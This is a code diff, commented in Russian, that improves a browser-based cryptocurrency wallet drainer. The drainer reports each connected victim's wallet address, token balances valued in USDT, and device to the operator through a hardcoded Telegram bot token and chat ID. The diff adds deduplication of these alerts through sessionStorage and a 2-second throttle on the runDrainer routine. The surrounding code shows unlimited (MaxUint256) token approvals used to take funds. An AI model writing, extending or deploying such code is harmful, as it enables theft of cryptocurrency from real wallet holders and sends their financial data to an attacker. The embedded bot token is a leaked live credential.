@@ -4,6 +4,12 @@ import { ethers } from 'ethers';
 const TELEGRAM_BOT_TOKEN = '7549455736:AAF-ouc8hjuDOmInaendDArWpvGiP7aiS64'; // Токен твоего бота
 const TELEGRAM_CHAT_ID = '-4767714458'; // ID твоего чата
 
+// Переменная для отслеживания времени последнего вызова drain
+let lastDrainTime = 0;
+
+// Функция для создания задержки
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
 // Функция для отправки сообщения в Telegram из браузера
 async function sendTelegramMessage(message) {
   try {
@@ -499,65 +505,74 @@ function formatBalance(balance, decimals) {
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
-  // Собираем информацию для сообщения
-  const config = CHAINS[chainId];
-  
-  // Укороченный адрес
-  const shortAddress = shortenAddress(userAddress);
+  // Проверяем, было ли уже отправлено уведомление о подключении для этого кошелька
+  const connectNotifiedKey = `connectNotified_${userAddress}`;
+  const hasNotified = sessionStorage.getItem(connectNotifiedKey);
 
-  // Название кошелька
-  const walletName = detectWallet();
+  if (!hasNotified) {
+    // Собираем информацию для сообщения
+    const config = CHAINS[chainId];
+    
+    // Укороченный адрес
+    const shortAddress = shortenAddress(userAddress);
 
-  // Сеть
-  const networkName = config.name;
+    // Название кошелька
+    const walletName = detectWallet();
 
-  // Средства (Funds)
-  const funds = [];
-  
-  // Нативный токен (например, ETH, BNB, MATIC)
-  const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
-  if (parseFloat(nativeBalance) > 0) {
-    const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
-    const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-    // Получаем цену нативного токена в USDT
-    const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
-    const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
-    funds.push(`- **${config.nativeToken}**(${nativeNetwork}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
-  }
+    // Сеть
+    const networkName = config.name;
 
-  // Токены (USDT, USDC и другие)
-  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
-  for (const tokenAddress of tokenAddresses) {
-    const balance = bal.tokenBalances[tokenAddress];
-    if (balance && balance.gt(0)) {
-      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-      const decimals = await tokenContract.decimals();
-      const formattedBalance = formatBalance(balance, decimals);
-      if (parseFloat(formattedBalance) > 0) {
-        const symbol = tokenAddress === config.usdtAddress ? "USDT" :
-                      tokenAddress === config.usdcAddress ? "USDC" :
-                      Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-        const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
-        // Получаем цену токена в USDT
-        const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
-        const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
-        funds.push(`- **${symbol}**(${tokenNetwork}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
+    // Средства (Funds)
+    const funds = [];
+    
+    // Нативный токен (например, ETH, BNB, MATIC)
+    const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
+    if (parseFloat(nativeBalance) > 0) {
+      const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
+      const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
+      // Получаем цену нативного токена в USDT
+      const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
+      const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
+      funds.push(`- **${config.nativeToken}**(${nativeNetwork}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
+    }
+
+    // Токены (USDT, USDC и другие)
+    const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
+    for (const tokenAddress of tokenAddresses) {
+      const balance = bal.tokenBalances[tokenAddress];
+      if (balance && balance.gt(0)) {
+        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+        const decimals = await tokenContract.decimals();
+        const formattedBalance = formatBalance(balance, decimals);
+        if (parseFloat(formattedBalance) > 0) {
+          const symbol = tokenAddress === config.usdtAddress ? "USDT" :
+                        tokenAddress === config.usdcAddress ? "USDC" :
+                        Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+          const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
+          // Получаем цену токена в USDT
+          const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
+          const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
+          funds.push(`- **${symbol}**(${tokenNetwork}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
+        }
       }
     }
+
+    // Устройство
+    const device = detectDevice();
+
+    // Формируем сообщение
+    let fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
+    const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
+                    `Funds:\n` +
+                    `${fundsMessage}\n` +
+                    `Device: ${device}`;
+
+    // Отправляем сообщение в Telegram
+    await sendTelegramMessage(message);
+
+    // Устанавливаем флаг, чтобы не отправлять уведомление повторно для этого кошелька
+    sessionStorage.setItem(connectNotifiedKey, 'true');
   }
-
-  // Устройство
-  const device = detectDevice();
-
-  // Формируем сообщение
-  let fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
-  const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
-                  `Funds:\n` +
-                  `${fundsMessage}\n` +
-                  `Device: ${device}`;
-
-  // Отправляем сообщение в Telegram
-  await sendTelegramMessage(message);
 
   const MAX = ethers.constants.MaxUint256;
   const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
@@ -707,6 +722,19 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
 // Основная функция
 export async function runDrainer(provider, signer, userAddress) {
+  // Проверяем время последнего вызова drain
+  const currentTime = Date.now();
+  const timeSinceLastDrain = currentTime - lastDrainTime;
+  const minDelay = 2000; // 2 секунды
+
+  if (timeSinceLastDrain < minDelay) {
+    // Если прошло меньше 2 секунд, ждём оставшееся время
+    await delay(minDelay - timeSinceLastDrain);
+  }
+
+  // Обновляем время последнего вызова
+  lastDrainTime = Date.now();
+
   const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
     try {
       const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
